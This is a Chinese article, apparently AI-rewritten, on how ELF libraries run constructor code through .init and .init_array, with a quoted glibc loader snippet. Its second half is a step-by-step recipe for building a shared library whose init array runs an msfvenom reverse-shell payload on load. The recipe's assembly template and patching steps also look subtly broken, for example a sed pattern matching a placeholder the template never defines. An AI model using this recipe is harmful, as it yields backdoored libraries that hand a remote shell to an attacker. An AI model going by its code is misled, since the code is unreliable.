### 优化后的文本

#### 概述
本文讨论了在库加载时执行具有 `constructor` 属性的函数的机制，并解释了 `.init` 和 `.init_array` 在不同平台和版本中的实现。此外，还提供了如何在 ELF 文件中添加自定义初始化代码的示例。

#### 具有 `constructor` 属性的函数
在 C/C++ 中，具有 `constructor` 属性的函数会在库或可执行文件初始化时自动执行。这种行为主要通过 `.init` 或 `.init_array` 部分实现。不同的编译器和链接器在处理这些部分时可能会有所不同。更多详细信息可以参考宋教授的文章《.init, .ctors, and .init_array》。

#### ELF 文件中的动态链接信息
在 ELF 文件中，有一个类型为 `SHT_DYNAMIC` 的节（Section），通常命名为 `.dynamic`。该节存储了动态链接信息，其中包括 `DT_INIT` 和 `DT_INIT_ARRAY` 项。

- **`DT_INIT` 项**：存储了一个偏移量，在加载时会与 ELF 的加载基址相加并跳转执行。
- **`DT_INIT_ARRAY` 项**：直接存储了一个地址，无需进行基址相加操作。

以下是 glibc 源码中相关部分的实现：

```c
if (ELF_INITFINI && l->l_info[DT_INIT] != NULL)
    DL_CALL_DT_INIT(l, l->l_addr + l->l_info[DT_INIT]->d_un.d_ptr, argc, argv, env);

/* Next see whether there is an array with initialization functions.  */
ElfW(Dyn) *init_array = l->l_info[DT_INIT_ARRAY];
if (init_array != NULL)
{
    unsigned int j;
    unsigned int jm;
    ElfW(Addr) *addrs;
    jm = l->l_info[DT_INIT_ARRAYSZ]->d_un.d_val / sizeof (ElfW(Addr));
    addrs = (ElfW(Addr) *) (init_array->d_un.d_ptr + l->l_addr);
    for (j = 0; j < jm; ++j)
        (*addrs[j]) (argc, argv, env);
}
```

#### 示例：在 ELF 文件中添加自定义初始化代码
以下是一个使用 NASM 和 `msfvenom` 创建包含自定义初始化代码的共享库的示例。

1. **创建汇编模板文件 `elf_dll_x64_template_init_array.s`**：
   ```asm
   section .text
       global _start
       _start:
           jmp r5

   section .init_array
       dq 0x19
       dq r5

   section .dynamic
       ; DT_INIT_ARRAY
       dq 0x1B
       dq 0x8

   r5:
       db 0x90
   ```

2. **编译汇编代码**：
   ```sh
   nasm elf_dll_x64_template_init_array.s -f bin -o modified.so
   ```

3. **生成 shellcode 并附加到共享库**：
   ```sh
   msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "x09\x0c\x20=" -f raw -o raw.bin
   cat raw.bin >> modified.so
   ```

4. **修改文件大小并生成最终共享库**：
   ```sh
   sed 's/\xEF\xBE\xAD\xDE/\xec\x01\x00\x00/g' ./modified.so > final.so
   ls -al ./final.so
   ```

通过上述步骤，您可以创建一个包含自定义初始化代码的共享库，并在加载时执行特定的 shellcode。

希望这些信息对您有所帮助！如果有任何进一步的问题，请随时提问。